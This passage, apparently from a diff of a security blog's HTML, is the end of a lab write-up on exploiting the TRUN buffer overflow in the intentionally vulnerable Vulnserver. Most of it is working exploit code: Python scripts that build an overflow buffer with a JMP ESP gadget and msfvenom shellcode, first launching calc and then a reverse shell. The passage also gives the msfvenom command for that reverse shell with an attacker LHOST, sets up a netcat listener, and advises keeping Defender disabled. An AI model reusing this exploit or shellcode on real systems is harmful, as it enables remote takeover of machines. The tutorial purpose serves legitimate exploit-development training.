+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xdb\xd7\xbe\x81\x73\xbe\xe6\xd9\x74\x24\xf4\x5a</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x33\xc9\xb1\x31\x83\xc2\x04\x31\x72\x14\x03\x72</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x95\x91\x4b\x1a\x7d\xd7\xb4\xe3\x7d\xb8\x3d\x06</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x4c\xf8\x5a\x42\xfe\xc8\x29\x06\xf2\xa3\x7c\xb3</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x81\xc6\xa8\xb4\x22\x6c\x8f\xfb\xb3\xdd\xf3\x9a</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x37\x1c\x20\x7d\x06\xef\x35\x7c\x4f\x12\xb7\x2c</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x18\x58\x6a\xc1\x2d\x14\xb7\x6a\x7d\xb8\xbf\x8f</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x35\xbb\xee\x01\x4e\xe2\x30\xa3\x83\x9e\x78\xbb</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc0\x9b\x33\x30\x32\x57\xc2\x90\x0b\x98\x69\xdd</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xa4\x6b\x73\x19\x02\x94\x06\x53\x71\x29\x11\xa0</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x08\xf5\x94\x33\xaa\x7e\x0e\x98\x4b\x52\xc9\x6b</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x47\x1f\x9d\x34\x4b\x9e\x72\x4f\x77\x2b\x75\x80</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xfe\x6f\x52\x04\x5b\x2b\xfb\x1d\x01\x9a\x04\x7d</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xea\x43\xa1\xf5\x06\x97\xd8\x57\x4c\x66\x6e\xe2</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x22\x68\x70\xed\x12\x01\x41\x66\xfd\x56\x5e\xad</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xba\xa9\x14\xec\xea\x21\xf1\x64\xaf\x2f\x02\x53</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x49\x81\x56\x8b\xad\x99\x12\x8e\xea\x1d\xce</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xe2\x63\xc8\xf0\x51\x83\xd9\x92\x34\x17\x81\x7a</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xd3\x9f\x20\x83</span><span class="s2">"</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"TRUN /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">esp_gadget</span>        <span class="c1"># JMP ESP</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">NOP</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">payload</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Calc pops successfully:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Calc popped" src="/assets/img/vulnserver_trun_50_pop_calc.png"/></div></div></p>
+<h2 id="reverse-shell">Reverse Shell<a class="headerlink" href="#reverse-shell" title="Permanent link"> </a></h2>
+<p>Before you do this, make sure you still have Defender completely deactivated. Defender usually detects the vanilla msfvenom reverse shells.</p>
+<p>Here is the msfvenom command for generating a common reverse shell:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.2.79 <span class="nv">LPORT</span><span class="o">=</span><span class="m">53</span> -f py -v payload -e x86/shikata_ga_nai -b <span class="s1">'\x00\x0A'</span> <span class="nv">EXITFUNC</span><span class="o">=</span>thread
+</code></pre></div></div></div>
+<p>Once again we give msfvenom our badchars via the <code>-b</code> parameter. Also we use <code>EXITFUNC=thread</code>, this allows the server to recover from our command execution instead of crashing every time.</p>
+<p>Here <code>10.0.2.79</code> is the IP address of your attacker VM and <code>53</code> is the listening port of your netcat listener.</p>
+<p>On your attacker VM listen for a reverse shell:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ sudo nc -vlnp <span class="m">53</span>
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali: 
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+</code></pre></div></div></div>
+<p>Adapt the script:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># Simple socket buffer overflow</span>
+<span class="c1"># Step 7 - Full Exploit</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">2005</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>         <span class="c1"># new line 0x0a</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span> <span class="p">]</span>   <span class="c1"># found badchars</span>
+<span class="n">esp_gadget_address</span> <span class="o">=</span> <span class="mh">0x625011af</span>
+<span class="n">esp_gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">esp_gadget_address</span><span class="p">)</span>
+<span class="n">NOP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span>
+
+<span class="c1"># msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.79 LPORT=53 -f py -v payload -e x86/shikata_ga_nai -b '\x00\x0A' EXITFUNC=thread</span>
+<span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xdb\xcf\xd9\x74\x24\xf4\x5a\xbb\x52\xbf\xb0\x52</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x33\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x13\x03\x08</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xac\x52\xa7\x50\x3a\x10\x48\xa8\xbb\x75\xc0\x4d</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x8a\xb5\xb6\x06\xbd\x05\xbc\x4a\x32\xed\x90\x7e</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc1\x83\x3c\x71\x62\x29\x1b\xbc\x73\x02\x5f\xdf</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf7\x59\x8c\x3f\xc9\x91\xc1\x3e\x0e\xcf\x28\x12</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc7\x9b\x9f\x82\x6c\xd1\x23\x29\x3e\xf7\x23\xce</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf7\xf6\x02\x41\x83\xa0\x84\x60\x40\xd9\x8c\x7a</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x85\xe4\x47\xf1\x7d\x92\x59\xd3\x4f\x5b\xf5\x1a</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x60\xae\x07\x5b\x47\x51\x72\x95\xbb\xec\x85\x62</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc1\x2a\x03\x70\x61\xb8\xb3\x5c\x93\x6d\x25\x17</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x9f\xda\x21\x7f\xbc\xdd\xe6\xf4\xb8\x56\x09\xda</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x48\x2c\x2e\xfe\x11\xf6\x4f\xa7\xff\x59\x6f\xb7</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x5f\x05\xd5\xbc\x72\x52\x64\x9f\x1a\x97\x45\x1f</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xdb\xbf\xde\x6c\xe9\x60\x75\xfa\x41\xe8\x53\xfd</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xa6\xc3\x24\x91\x58\xec\x54\xb8\x9e\xb8\x04\xd2</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x37\xc1\xce\x22\xb7\x14\x40\x72\x17\xc7\x21\x22</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xd7\xb7\xc9\x28\xd8\xe8\xea\x53\x32\x81\x81\xae</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xd5\xa4\x55\xb2\x6a\xd1\x57\xb2\x74\x14\xd1\x54</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x1e\x46\xb7\xcf\xb7\xff\x92\x9b\x26\xff\x08\xe6</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x69\x8b\xbe\x17\x27\x7c\xca\x0b\xd0\x8c\x81\x71</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x77\x92\x3f\x1d\x1b\x01\xa4\xdd\x52\x3a\x73\x8a</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x33\x8c\x8a\x5e\xae\xb7\x24\x7c\x33\x21\x0e\xc4</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xe8\x92\x91\xc5\x7d\xae\xb5\xd5\xbb\x2f\xf2\x81</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x13\x66\xac\x7f\xd2\xd0\x1e\x29\x8c\x8f\xc8\xbd</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x49\xfc\xca\xbb\x55\x29\xbd\x23\xe7\x84\xf8\x5c</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc8\x40\x0d\x25\x34\xf1\xf2\xfc\xfc\x11\x11\xd4</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x08\xba\x8c\xbd\xb0\xa7\x2e\x68\xf6\xd1\xac\x98</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x87\x25\xac\xe9\x82\x62\x6a\x02\xff\xfb\x1f\x24</span><span class="s2">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xac\xfc\x35</span><span class="s2">"</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"TRUN /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">esp_gadget</span>        <span class="c1"># JMP ESP</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">NOP</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">payload</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Run the exploit and you should receive a shell:</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Reverse shell received" src="/assets/img/vulnserver_trun_66_exploit.png"/></div></div></p>
+                    <div class="article-meta">
+                        <section class="article-share-section">
+                            <a href="https://twitter.com/intent/tweet?text=Vulnserver%20Part%201%20-%20TRUN%20https%3A%2F%2Fsecoats.github.io%2Fposts%2Fvulnserver_1_trun.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+                            <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsecoats.github.io%2Fposts%2Fvulnserver_1_trun.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+                            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fsecoats.github.io%2Fposts%2Fvulnserver_1_trun.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+                          </section>
+                        <section class="article-meta-section">
+                            <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+                            <span itemprop="keywords">
+                                <a href="/tags.html#vulnserver" class="article-tag" rel="tag">vulnserver</a><span class="sep"> </span>
+                                <a href="/tags.html#windows" class="article-tag" rel="tag">windows</a><span class="sep"> </span>
+                                <a href="/tags.html#bufferoverflow" class="article-tag" rel="tag">bufferoverflow</a><span class="sep"> </span>
+                                <a href="/tags.html#binary" class="article-tag" rel="tag">binary</a><span class="sep"> </span>
+                                <a href="/tags.html#exploit" class="article-tag" rel="tag">exploit</a><span class="sep"> </span>
+                                <a href="/tags.html#bof" class="article-tag" rel="tag">bof</a><span class="sep"> </span>
+                            </span>
+                        </section>
+                        <section class="article-meta-section">
+                            <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+                            <span itemprop="keywords">
+                                <a href="/categories.html#writeup" class="article-tag" rel="tag">writeup</a>
+                            </span>
+                        </section>
+                        <section class="article-meta-section">
+                            <span style="margin-right:1em;"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Published:</strong> <time datetime="2021-09-07 12:01:00-04:00">September 07, 2021</time></span>
+                    
+                        </section> 
+                        <section class="article-meta-section">
+                            
+                            <span><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Last Updated:</strong> <time datetime="2021-09-07 12:01:00-04:00">September 07, 2021</time></span>
+                        </section>
+                    </div>
+                </article>
+            </main>
+            <div id="footerbar">
+                <footer class="wrapper">
+                    <div class="footer-info">
+                        <ul class="social-icons">
+    <li><a href="https://github.com/secoats" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    <!--<li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>-->
+    <li><a href="https://twitter.com/cybercereals" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> Twitter</a></li>
+</ul>
+<div class="copyright-notice">© 2021 secoats</div>
+                    </div>
+                </footer>
+            </div>
+        </div>
+        <script src="/assets/js/main.js"></script>
+    </body>
+</html>
